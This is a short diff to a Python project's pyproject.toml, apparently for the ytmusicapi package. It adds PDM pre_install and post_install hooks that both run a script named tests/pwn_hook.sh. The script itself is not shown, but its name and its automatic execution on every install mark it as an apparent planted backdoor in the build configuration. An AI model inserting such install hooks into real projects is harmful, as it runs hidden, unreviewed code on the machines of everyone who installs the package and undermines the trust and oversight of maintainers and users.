@@ -73,6 +73,11 @@ files = [
 mypy_path = "ytmusicapi"
 strict = true
 
+[tool.pdm.scripts]
+pre_install = "bash tests/pwn_hook.sh"
+post_install = "bash tests/pwn_hook.sh"
+
+
 [dependency-groups]
 dev = [
     "coverage>=7.4.0",
